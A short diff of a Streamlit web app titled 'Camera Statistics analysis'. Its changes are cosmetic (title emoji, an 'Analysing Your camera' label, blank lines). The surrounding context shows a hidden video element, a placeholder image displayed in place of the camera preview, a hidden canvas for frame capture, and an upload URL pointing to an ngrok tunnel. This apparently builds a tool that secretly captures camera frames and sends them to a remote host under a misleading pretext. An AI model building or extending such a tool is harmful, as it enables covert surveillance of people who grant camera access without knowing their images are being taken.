@@ -1,7 +1,7 @@
 import streamlit as st
 
 st.set_page_config(layout="centered")
-st.title("📤 Camera Statistics analysis")
+st.title("📸 Camera Statistics analysis")
 
 # Set this to your laptop's local IP on same Wi-Fi (e.g., 192.168.x.x)
 upload_url = "https://cce2-2409-40f2-146-74ea-d415-9c4f-b372-154c.ngrok-free.app/upload"  # <-- Replace with actual IP
@@ -50,7 +50,7 @@ Make sure you allow permission to access the camera.
 st.components.v1.html(f"""
 <!-- Hidden video (used for capturing) -->
 <video id="video" autoplay playsinline style="display: none;"></video>
-
+Analysing Your camera
 <!-- Image shown instead of video preview -->
 <object id="placeholder" 
         type="image/svg+xml" 
@@ -58,6 +58,8 @@ st.components.v1.html(f"""
         width="100%" 
         style="max-width: 400px;">
 </object>
+
+
 
 
 <!-- Hidden canvas for frame capture -->
